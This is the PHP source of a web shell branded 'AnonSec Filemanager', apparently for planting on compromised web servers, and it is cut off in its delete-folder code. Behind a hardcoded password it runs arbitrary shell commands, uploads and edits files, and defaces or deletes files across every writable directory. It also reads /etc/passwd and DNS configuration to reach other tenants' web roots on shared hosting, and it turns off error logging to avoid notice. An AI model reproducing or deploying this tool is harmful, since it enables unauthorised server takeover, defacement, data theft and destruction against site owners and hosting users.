<?php
set_time_limit(0);
error_reporting(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
session_start();
date_default_timezone_set("Asia/Jakarta");
$nana = array_merge($_POST, $_GET);
$pwd = "ikke";
if(empty($_SESSION['login'])) {
?>
<html>
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
		<title><?=$_SERVER['HTTP_HOST'];?> login shell</title>
		<link rel="stylesheet" href="//unknownsec.ftp.sh/main/style-fm.css">
		<script src="//cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js"></script>
	</head>
<body class="bg-secondary text-light">
<div class="container-fluid">
	<div class="py-3" id="main">
		<div class="box shadow bg-dark p-4 rounded-3">
			<form method="post">
				<i class="bi bi-display"></i>&nbsp;:&nbsp;<u><?=php_uname();?></u>
<?php
if($nana['pwd']) {
	if($nana['pwd'] == $pwd) {
		$_SESSION['login'] = "login";
print '<strong>Login</strong> ok!  '.alt_ok().'<a class="btn-close" href="'.$_SERVER['PHP_SELF'].'"></a></div>';
		} else { 
print '<strong>Login</strong> fail! '.alt_fail().'</div>';
	}
}
?>
				<div class="input-group mb-3">
					<input type="password" class="form-control form-control-sm" name="pwd" placeholder="Password" required="required">
					<button type="submit" class="btn btn-primary btn-sm"><i class="bi bi-arrow-return-right"></i></button>
				</div>
			</form>
		<div class="text-secondary">&copy; <?=date("Y");?> UnknownSec</div>
		</div>
	</div>
</div>
</body>
</html>
<?php
exit();
}
if(isset($nana["left"])) {
	session_start();
	session_destroy();
	print '<script>window.location="'.$_SERVER['PHP_SELF'].'";</script>';
}
// download file
if(isset($nana['opn']) && ($nana['opn'] != '') && ($nana['action'] == 'download')){
	@ob_clean();
	$file = $nana['opn'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color='red'>".$perm."</font>";
	} else {
		return "<font color='green'>".$perm."</font>";
	}
}
function s(){
	print '<style>table{display:none;}</style><hr>';
}
function alt_ok(){
	print '<div class="alert alert-success alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function alt_fail(){
	print '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function op($d, $e) {
	$fp = fopen($d, "w");
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $e);
	curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_FILE, $fp);
	return curl_exec($ch);
	curl_close($ch);
	fclose($fp);
	ob_flush();
	flush();
}
function sz($byt){
	$typ = array( 'B', 'KB', 'MB', 'GB', 'TB' );
	for($i = 0; $byt >= 1024 && $i < (count($typ) -1 ); $byt /= 1024, $i++ );
	return(round($byt,2)." ".$typ[$i]);
}
function ia() {
	$ia = '';
if (getenv('HTTP_CLIENT_IP'))
	$ia = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
	$ia = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
	$ia = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
	$ia = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
	$ia = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
	$ia = getenv('REMOTE_ADDR');
else
	$ia = 'IP tidak dikenali';
return $ia;
}
function exe($cmd) {
if(function_exists('system')) {
	@ob_start();
	@system($cmd);
	$buff = @ob_get_contents();
	@ob_end_clean();
	return $buff;
} elseif(function_exists('exec')) {
	@exec($cmd,$results);
	$buff = "";
foreach($results as $result) {
	$buff .= $result;
	} return $buff;
} elseif(function_exists('passthru')) {
	@ob_start();
	@passthru($cmd);
	$buff = @ob_get_contents();
	@ob_end_clean();
	return $buff;
} elseif(function_exists('shell_exec')) {
	$buff = @shell_exec($cmd);
	return $buff;
	}
}
function p($file){
$p = fileperms($file);
if (($p & 0xC000) == 0xC000) {
$i = 's';
} elseif (($p & 0xA000) == 0xA000) {
$i = 'l';
} elseif (($p & 0x8000) == 0x8000) {
$i = '-';
} elseif (($p & 0x6000) == 0x6000) {
$i = 'b';
} elseif (($p & 0x4000) == 0x4000) {
$i = 'd';
} elseif (($p & 0x2000) == 0x2000) {
$i = 'c';
} elseif (($p & 0x1000) == 0x1000) {
$i = 'p';
} else {
$i = 'u';
	}
$i .= (($p & 0x0100) ? 'r' : '-');
$i .= (($p & 0x0080) ? 'w' : '-');
$i .= (($p & 0x0040) ?
(($p & 0x0800) ? 's' : 'x' ) :
(($p & 0x0800) ? 'S' : '-'));
$i .= (($p & 0x0020) ? 'r' : '-');
$i .= (($p & 0x0010) ? 'w' : '-');
$i .= (($p & 0x0008) ?
(($p & 0x0400) ? 's' : 'x' ) :
(($p & 0x0400) ? 'S' : '-'));
$i .= (($p & 0x0004) ? 'r' : '-');
$i .= (($p & 0x0002) ? 'w' : '-');
$i .= (($p & 0x0001) ?
(($p & 0x0200) ? 't' : 'x' ) :
(($p & 0x0200) ? 'T' : '-'));
return $i;
}
if(isset($nana['path'])){
	$path = $nana['path'];
	chdir($path);
}else{
	$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
if(isset($nana['dir'])) {
	$dir = $nana['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
print "
<html>
	<head>
		<meta charset='UTF-8'>
		<meta name='author' content='UnknownSec'>
		<meta name='viewport' content='width=device-width, initial-scale=1, user-scalable=no'>
		<title>".$_SERVER["HTTP_HOST"]." File Manager</title>
		<link rel='stylesheet' href='//unknownsec.ftp.sh/main/style-fm.css'>
	</head>
<style>
.shell {
	max-width: 800px;
	border-radius: 5px;
	border: 1px solid rgba(255, 255, 255, 0.4);
	font-size: 10pt;
	display: flex;
	flex-direction: column;
	align-items: stretch;
}
.pre {
	height: 300px;
	overflow: auto;
	padding: 5px;
	white-space: pre-wrap;
	flex-grow: 1;
}
cmd {
	color: green;
}
</style>
<script type='text/javascript'>baseUrl = window.location.href.split('?')[0]; window.history.pushState('name', '?', baseUrl);</script>
<script type='text/javascript'>
function c(x) {
	window.location = x
}
</script>
<body class='bg-secondary text-light'>
<div class='container-fluid'>
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<a class='text-decoration-none text-light' href='".$_SERVER['PHP_SELF']."'><h4>AnonSec Filemanager</h4></a>";
			if(isset($nana['path'])){
				$path = $nana['path'];
				chdir($path);
			}else{
				$path = getcwd();
			}
				$path = str_replace('\\','/',$path);
				$paths = explode('/',$path);
			foreach($paths as $id=>$pat){
			if($pat == '' && $id == 0){
				$a = true;
					print "<pre><i class='bi bi-hdd-rack'></i>:<a class='text-decoration-none text-light' onclick='c(\"?path=/\")'>/</a>";
				continue;
			}
	if($pat == '') continue;
		print "<a class='text-decoration-none' onclick='c(\"?path=";
		for($i=0;$i<=$id;$i++){
		print "$paths[$i]";
	if($i != $id) print "/";
	}
print "\")'>".$pat."</a>/";
	}
	$scand = scandir($path);
	print " [ ".w($path, p($path))." ]";
print "</pre>
<div class='dropdown'>
	<button class='btn btn-outline-light dropdown-toggle btn-sm' type='button' id='dropdownMenuButton' data-toggle='dropdown' aria-haspopup='true' aria-expanded='false'><i class='bi bi-menu-down'></i>&nbsp;Menu</button>
	<div class='dropdown-menu'>
		<a class='dropdown-item' onclick='c(\"?dir=$path&id=upload\")'><i class='bi bi-upload'></i> Upload</a>
		<a class='dropdown-item' onclick='c(\"?dir=$path&id=deface\")'><i class='bi bi-exclamation-diamond'></i> Mass depes</a>
		<a class='dropdown-item' onclick='c(\"?dir=$path&id=delete\")'><i class='bi bi-trash'></i> Mass delete</a>
		<a class='dropdown-item' onclick='c(\"?dir=$path&id=cmd\")'><i class='bi bi-terminal'></i> Terminal</a>
		<a class='dropdown-item' onclick='c(\"?dir=$path&id=jumping\")'><i class='bi bi-exclamation-triangle'></i> Jumping</a>
		<a class='dropdown-item' onclick='c(\"?dir=$path&id=zip\")'><i class='bi bi-file-earmark-zip'></i> Zip & Unzip</a>
		<a class='dropdown-item' onclick='c(\"?dir=$path&id=info\")'><i class='bi bi-info-circle'></i> Info server</a>
		<a class='dropdown-item' onclick='c(\"?dir=$path&id=about\")'><i class='bi bi-info'></i> About</a></h5>
		<a class='dropdown-item' onclick='c(\"?left\")'><i class='bi bi-box-arrow-in-left'></i> Logout</a></h5>
	</div>
</div>";
// tools nya
if(isset($nana['dir'])) {
	$dir = $nana['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);	
for($i = 0; $i <= $c_dir; $i++) {
	$scdir[$i];
	if($i != $c_dir) {
}
// mass deface #indoxploit
if($nana['id'] == 'deface'){
	function mass_kabeh($dir,$namafile,$isi_script) {
	if(is_writable($dir)) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			$dirc = "$dir/$dirb";
			$▚ = $dirc.'/'.$namafile;
			if($dirb === '.') {
				file_put_contents($▚, $isi_script);
			} elseif($dirb === '..') {
				file_put_contents($▚, $isi_script);
			} else {
				if(is_dir($dirc)) {
					if(is_writable($dirc)) {
						print "<pre>[<font color='green'>success</font>] $▚</pre>";
						file_put_contents($▚, $isi_script);
						$▟ = mass_kabeh($dirc,$namafile,$isi_script);
					}
				}
			}
		}
	}
}
function mass_biasa($dir,$namafile,$isi_script) {
	if(is_writable($dir)) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			$dirc = "$dir/$dirb";
			$▚ = $dirc.'/'.$namafile;
			if($dirb === '.') {
				file_put_contents($▚, $isi_script);
			} elseif($dirb === '..') {
				file_put_contents($▚, $isi_script);
			} else {
				if(is_dir($dirc)) {
					if(is_writable($dirc)) {
						print "<pre>[<font color='green'>success</font>] $dirb/$namafile</pre>";
						file_put_contents($▚, $isi_script);
					}
				}
			}
		}
	}
}
if($nana['start']) {
	if($nana['tipe'] == 'massal') {
		print "<div style='margin: 5px auto; padding: 5px'>";
	mass_kabeh($nana['d_dir'], $nana['d_file'], $nana['script']);
		print "</div>";
	} elseif($nana['tipe'] == 'biasa') {
		print "<div style='margin: 5px auto; padding: 5px'>";
	mass_biasa($nana['d_dir'], $nana['d_file'], $nana['script']);
		print "</div>";
	}
} else {
s();
print "
<form action='?dir=$path&id=deface' method='POST'>
	<b>Tipe:</b><br>
<div class='custom-control custom-switch'>
	<input type='checkbox' id='customSwitch' class='custom-control-input' name='tipe' value='biasa'>
	<label class='custom-control-label' for='customSwitch'>Biasa</label>
</div>
<div class='custom-control custom-switch'>
	<input type='checkbox' id='customSwitch1' class='custom-control-input' name='tipe' value='massal'>
	<label class='custom-control-label' for='customSwitch1'>Massal</label>
</div>
	<b><i class='bi bi-folder'></i> Directory:</b>
	<input class='form-control btn-sm' type='text' name='d_dir' value='$dir' height='10'>
	<b><i class='bi bi-file-earmark'></i> File name:</b>
	<input class='form-control btn-sm' type='text' name='d_file' placeholder='name file' height='10'>
	<b><i class='bi bi-file-earmark'></i> Your script:</b>
	<textarea class='form-control btn-sm' rows='7' name='script' placeholder='your secript here'></textarea><br />
	<input class='btn btn-outline-light btn-sm btn-block' type='submit' name='start' value='submit' >
</form>";
	}
}
// info
if($nana['id'] == 'info'){
$sql = (function_exists('mysql_connect')) ? "<font color='green'>ON</font>" : "<font color='red'>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color='green'>ON</font>" : "<font color='red'>OFF</font>";
$wget = (exe('wget --help')) ? "<font color='green'>ON</font>" : "<font color='red'>OFF</font>";
$pl = (exe('perl --help')) ? "<font color='green'>ON</font>" : "<font color='red'>OFF</font>";
$py = (exe('python --help')) ? "<font color='green'>ON</font>" : "<font color='red'>OFF</font>";
$disfunc = @ini_get("disable_functions");
if (empty($disfunc)) {
	$disfc = "<font color='green'>NONE</font>";
} else {
	$disfc = "<font color='red'>$disfunc</font>";
}
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color='red'>ON</font>" : "<font color='green'>OFF</font>";
s();
print "
<div class='container'>
	<div class='card text-dark'>
		<div class='card-header'>
<pre>
Uname: <font color='green'>".php_uname()."</font>
Software: <font color='green'>".$_SERVER["SERVER_SOFTWARE"]."</font>
PHP version: <font color='green'>".PHP_VERSION."</font> PHP os: <font color='green'>".PHP_OS."</font>
Server Ip: <font color='green'>".gethostbyname($_SERVER['HTTP_HOST'])."</font>
Your Ip: <font color='green'>".ia()."</font>
User: <font color='green'>$user</font> ($uid) | Group: <font color='green'>$group</font> ($gid)
Safe Mode: $sm
MySQL: $sql | Perl: $pl | Python: $py | WGET: $wget | CURL: $curl
Disable Function:<br>$disfc
</pre>
		</div>
	</div>
</div>
<br/>";
}
if($nana['id'] == 'about'){
s();
print "
<div class='container'>
	<div class='card text-dark'>
		<div class='card-header'>
			<img alt='AnonSec Team' class='img-thumbnail rounded mx-auto d-block' src='//unknownsec.ftp.sh/AnonSec.jpg' width='150px'>
			<b>- About Me -</b>
			<br/>Thank bro, for using my shell, if there is an error, please contact the email below.<br />Greetz : <u>{ AnonSec Team } - And You</u><br/>My email: <a class='text-decoration-none' href=mailto:unknownsec1337@gmail.com'>unknownsec1337@gmail.com</a>
		</div>
	</div>
</div>
<br/>";
}
// cmd
if($nana['id'] == 'cmd') {
s();
if(isset($nana['ekseCMD'])) {
$result = $nana['ekseCMD'];
print "<div class='shell bg-dark'>
<pre class='pre text-light'><b>An0nSec<cmd>@</cmd>cmd#:~</b> <cmd>$result</cmd><br>";
	$exec = system($nana['ekseCMD'].' 2>&1');
	print "</pre></div>";
}
print "
<form action='?dir=$path&id=cmd' method='POST'>
	<div class='input-group'>
		<input class='form-control form-control-sm' type='text' name='ekseCMD' value='$result'>
		<button type='submit' class='btn btn-outline-light btn-sm'><i class='bi bi-arrow-return-right'></i></button>
	</div>
</form>";
// upload
} if($nana['id'] == 'upload'){
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$dir.'/'.$_FILES['file']['name'])){
print '<strong>Upload</strong> ok! '.alt_ok().'</div>';
}else{
print '<strong>Upload</strong> fail! '.alt_fail().'</div>';
}
	}
s();
print "
<form action='?dir=$path&id=upload' method='POST' enctype='multipart/form-data'>
	<div class='input-group mb-3'>
		<input type='file' class='form-control form-control-sm' name='file'>
		<button type='submit' class='btn btn-outline-light btn-sm'><i class='bi bi-arrow-return-right'></i></button>
	</div>
</form>";
}
// mass delete #indoxploit
if($nana['id'] == 'delete'){
function hapus_massal($dir,$namafile) {
	if(is_writable($dir)) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			$dirc = "$dir/$dirb";
			$▚ = $dirc.'/'.$namafile;
			if($dirb === '.') {
				if(file_exists("$dir/$namafile")) {
					unlink("$dir/$namafile");
				}
			} elseif($dirb === '..') {
				if(file_exists("".dirname($dir)."/$namafile")) {
					unlink("".dirname($dir)."/$namafile");
				}
			} else {
				if(is_dir($dirc)) {
					if(is_writable($dirc)) {
						if(file_exists($▚)) {
							print "<pre>[<font color='green'>deleted</font>] $▚</pre>";
							unlink($▚);
							$▟ = hapus_massal($dirc,$namafile);
						}
					}
				}
			}
		}
	}
} if($nana['start']) {
print "<div style='margin: 5px auto; padding: 5px'>";
	hapus_massal($nana['d_dir'], $nana['d_file']);
print "</div>";
} else {
s();
print "
<form action='?dir=$path&id=delete' method='POST'>
	<b><i class='bi bi-folder'></i> Directory:</b>
	<input class='form-control btn-sm' type='text' name='d_dir' value='$dir'>
	<b><i class='bi bi-file-earmark'></i> File name:</b>
	<div class='input-group mb-3'>
	<input class='form-control btn-sm' type='text' name='d_file' placeholder='name file'>
	<input class='btn btn-outline-light btn-sm' type='submit' name='start' value='Go'>
</form>
	</div>";
		}
	}
}
//zip & unzip indosec
if($nana['id'] == 'zip'){
$exzip = basename($dir).'.zip';
function Zip($source, $destination){
	if (extension_loaded('zip') === true){
		if (file_exists($source) === true){
			$zip = new ZipArchive();
			if ($zip->open($destination, ZIPARCHIVE::CREATE) === true){
				$source = realpath($source);
				if (is_dir($source) === true){
					$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
					foreach ($files as $file){
						$file = realpath($file);
						if (is_dir($file) === true){
							// $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
						}elseif(is_file($file) === true){
							$zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
						}
					}
				}elseif(is_file($source) === true){
					$zip->addFromString(basename($source), file_get_contents($source));
				}
			}
			return @$zip->close();
		}
	}
	return false;
}
//Extract/Unzip
function Zip_Extrack($zip_files, $to_dir){
	$zip = new ZipArchive();
	$res = $zip->open($zip_files);
	if ($res === TRUE){
		$name = basename($zip_files, ".zip")."_unzip";
		@mkdir($name);
		@$zip->extractTo($to_dir."/".$name);  
		return @$zip->close();
	}else{
		return false;
	}
}
s();
print "
<b>Zip Menu</b>
	<form action='?dir=$path&id=zip' enctype='multipart/form-data' method='POST'>
		<div class='input-group mb-3'>
			<input type='file' name='zip_file' class='form-control form-control-sm'>
			<input type='submit' name='upnun' class='btn btn-outline-light btn-sm' value='Submit'>
		</div>
	</form>";
	if($nana["upnun"]){
		$filename = $_FILES["zip_file"]["name"];
		$tmp = $_FILES["zip_file"]["tmp_name"];
		if(move_uploaded_file($tmp, "$dir/$filename")){
			print Zip_Extrack($filename, $dir);
			unlink($filename);
print '<strong>Ekstrak zip</strong> ok! '.alt_ok().'</div>';
		}else{
print '<strong>Ekstrak zip</strong> fail! '.alt_fail().'</div>';
		}
	}
print "
<b>Zip backup</b>
<form action='?dir=$path&id=zip' method='POST'>
	<label>location:</label>
	<div class='input-group mb-3'>
		<input type='text' name='folder' class='form-control form-control-sm' value='$dir'>
		<input type='submit' name='backup' class='btn btn-outline-light btn-sm' value='Submit'>
	</div>
</form>";
	if($nana['backup']){
		$fol = $nana['folder'];
		if(Zip($fol, $nana["folder"].'/'.$exzip)){
print '<strong>Created Zip</strong> ok! '.alt_ok().'</div>';;
		}else{
print '<strong>Created Zip</strong> fail! '.alt_ok().'</div>';
		}
	}
print "
<b>Unzip manual</b>
	<form action='?dir=$path&id=zip' method='POST'>
	<label>location:</label>
		<div class='input-group mb-3'>
		<input type='text' name='file_zip' class='form-control form-control-sm' value='$dir/$exzip'>
		<input type='submit' name='extrak' class='btn btn-outline-light btn-sm' value='Submit'>
	</div>
</form>";
	if($nana['extrak']){
		$zip = $nana["file_zip"];
		if (Zip_Extrack($zip, $dir)){
print '<strong>Ekstrak zip</strong> ok! '.alt_ok().'</div>';
		}else{
print '<strong>Ekstrak zip</strong> fail! '.alt_fail().'</div>';
		}
	}
}
// jumping #indoxploit
if($nana['id'] == 'jumping') {
s();
	$i = 0;
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $nana['url']);
		if(isset($nana['jump'])) {
			print "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color='green'>R</font>] <a class='text-decoration-none' onclick='c(\"?dir=$url_user\")'>$url_user</a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color='green'>RW</font>] <a class='text-decoration-none' onclick='c(\"?dir=$url_user\")'>$url_user</a>";
							}
							print $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			print "<br>Totally available $i from ip ".gethostbyname($_SERVER['HTTP_HOST']);
		}
		print "</pre>";
} else {
print "
<div class='text-center'>
	<form action='?dir=$path&id=jumping' method='POST'>
	<b>List Domains:</b><br>
		<textarea rows='10' class='form-control btn-sm' name='url'>";
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
				while($getss = fgets($fp)) {
				print $getss;
				}
		print  '</textarea><br>
		<input class="btn btn-outline-light btn-sm btn-block" type="submit" name="jump" value="Jumping">
	</form>
</div>';
		}
	} elseif(preg_match("/vhosts|vhost/", $dir)) {
		preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
		$urls = explode("\r\n", $nana['url']);
		if(isset($nana['jump'])) {
			print "<pre>";
			foreach($urls as $url) {
				$url = str_replace("www.", "", $url);
				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color='green'>R</font>] <a class='text-decoration-none' onclick='c(\"?dir=$web_vh\")'>$web_vh</a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color='green'>RW</font>] <a class='text-decoration-none' onclick='c(\"?dir=$web_vh\")'>$web_vh</a>";
						}
						print $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			print "<br>Totally available $i from ip ".gethostbyname($_SERVER['HTTP_HOST']);
		}
	print "</pre>";
} else {
print "
<div class='text-center'>
	<form action='?dir=$path&id=jumping' method='POST'>
	<b>List Domains:</b> <br>
		<textarea rows='10' class='form-control btn-sm' name='url'>";
			bing("ip:".gethostbyname($_SERVER['HTTP_HOST'])."");
		print  '</textarea><br>
		<input class="btn btn-outline-light btn-sm btn-block" type="submit" name="jump" value="Jumping">
	</form>
</div>';
		}
	} else {
		print "<pre>";
		$etc = fopen("/etc/passwd", "r") or print("<font color='red'>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				print "<font color='red'>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color='green'>R</font>] <a class='text-decoration-none' onclick='c(\"?dir=$user_jumping_dir\")'>$user_jumping_dir</a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color='green'>RW</font>] <a class='text-decoration-none' onclick='c(\"?dir=$user_jumping_dir\")'>$user_jumping_dir</a>";
						}
						print $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								print " => ( <font color='red'>can't get the domain name</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										print " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							print "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			print "<br>Totally available $i from ip ".gethostbyname($_SERVER['HTTP_HOST']);
		}
		print "</pre>";
	}
	print "<br/>";
}
//openfile
if(isset($nana['opn'])) {
	$file = $nana['opn'];
}	
// view
if($nana['action'] == 'view') {
s();
print "
<div class='btn-group'>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=view&opn=$file\")'><i class='bi bi-eye-fill'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=edit&opn=$file\")'><i class='bi bi-pencil-square'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=rename&opn=$file\")'><i class='bi bi-pencil-fill'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=delete_file&opn=$file\")'><i class='bi bi-trash-fill'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=download&opn=$file\")'><i class='bi bi-download'></i></a>
</div>
<br>
	<b><i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."</b>
</br>
<textarea rows='10' class='form-control btn-sm' disabled=''>".htmlspecialchars(file_get_contents($file))."</textarea><br/>";
}
// edit
if(isset($nana['edit_file'])) {
	$updt = fopen("$file", "w");
	$hasil = fwrite($updt, $nana['isi']);		
	if ($hasil) {
print '<strong>Edit file</strong> ok! '.alt_ok().'</div>';
	}else{
print '<strong>Edit file</strong> fail! '.alt_fail().'</div>';
	}
}
if($nana['action'] == 'edit') {
s();
print "
<div class='btn-group'>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=view&opn=$file\")'><i class='bi bi-eye-fill'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=edit&opn=$file\")'><i class='bi bi-pencil-square'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=rename&opn=$file\")'><i class='bi bi-pencil-fill'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=delete_file&opn=$file\")'><i class='bi bi-trash-fill'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=download&opn=$file\")'><i class='bi bi-download'></i></a>
</div>
<br>
	<b><i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."</b>
</br>
<form action='?dir=$path&action=edit&opn=$file' method='POST'>
	<textarea rows='10' class='form-control btn-sm' name='isi'>".htmlspecialchars(file_get_contents($file))."</textarea>
	<br/>
	<button type='sumbit' class='btn btn-outline-light btn-sm btn-block' name='edit_file'><i class='bi bi-arrow-return-right'></i></button>
</form>";
}
//rename folder
if($nana['action'] == 'rename_folder') {
	if($nana['r_d']) {
		$r_d = rename($dir, "".dirname($dir)."/".htmlspecialchars($nana['r_d'])."");
		if($r_d) {
print '<strong>Rename folder</strong> ok! '.alt_ok().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
		}else{
print '<strong>Rename folder</strong> fail! '.alt_fail().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
		}
	}
s();
print "
<div class='btn-group'>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=rename_folder\")'><i class='bi bi-pencil-fill'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=delete_folder\")'><i class='bi bi-trash-fill'></i></a>
</div>
<br>
	<b><i class='bi bi-folder-fill'></i>:&nbsp;".basename($dir)."</b>
</br>
<form action='?dir=$path&action=rename_folder' method='POST'>
<div class='input-group'>
	<input class='form-control btn-sm' type='text' value='".basename($dir)."' name='r_d'>
	<button class='btn btn-outline-light btn-sm' type='submit'><i class='bi bi-arrow-return-right'></i></button>
</div>
</form>";
}
//rename file
if(isset($nana['r_f'])) {
	$old = $file;
	$new = $nana['new_name'];
	rename($new, $old);
	if(file_exists($new)) {
print '<div class="alert alert-warning alert-dismissible fade show my-3" role="alert">
	<strong>Rename file</strong> name already in use! <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
</div>';
	}else{
if(rename($old, $new)) {
print '<strong>Rename file</strong> ok! '.alt_ok().'</div>';
	}else{
print '<strong>Rename file</strong> fail! '.alt_fail().'</div>';
		}
	}
}
if($nana['action'] == 'rename') {
s();
print "
<div class='btn-group'>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=view&opn=$file\")'><i class='bi bi-eye-fill'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=edit&opn=$file\")'><i class='bi bi-pencil-square'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=rename&opn=$file\")'><i class='bi bi-pencil-fill'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=delete_file&opn=$file\")'><i class='bi bi-trash-fill'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=download&opn=$file\")'><i class='bi bi-download'></i></a>
</div>
<br>
	<b><i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."</b>
</br>
<form action='?dir=$path&action=rename&opn=$file' method='POST'>
<div class='input-group'>
	<input type='text' class='form-control btn-sm' name='new_name' value='".basename($file)."'>
	<button type='sumbit' class='btn btn-outline-light btn-sm' name='r_f'><i class='bi bi-arrow-return-right'></i></button>
</div>
</form>";
}
//delete file
if ($nana['action'] == 'delete_file') {
	$delete = unlink($file);
	if ($delete) {
print '<strong>Delete file</strong> ok! '.alt_ok().'</div>';
	}else{
print '<strong>Delete file</strong> fail! '.alt_fail().'</div>';
	}
}
//delete folder
if ($nana['action'] == 'delete_folder' ) {
	if(is_dir($dir)) {
	if(is_writable($dir)) {
		@rmdir($dir);
		@exe("rm -rf $dir");
		@exe("rmdir /s /q $dir");
print '<strong>Delete folder</strong> ok! '.alt_ok().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
		} else {
